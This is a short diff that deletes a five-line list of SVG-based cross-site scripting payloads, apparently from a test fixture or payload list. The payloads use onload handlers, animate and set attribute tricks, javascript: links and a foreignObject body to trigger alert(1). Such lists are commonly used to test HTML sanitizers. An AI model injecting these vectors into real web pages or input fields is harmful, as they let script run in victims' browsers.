@@ -1,5 +1,0 @@
-<svg/onload=alert(1)>
-<svg><animate attributeName=href to=javascript:alert(1) dur=1s/></svg>
-<svg><set attributeName=onload to="alert(1)"/></svg>
-<svg><a xlink:href="javascript:alert(1)">click</a></svg>
-<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
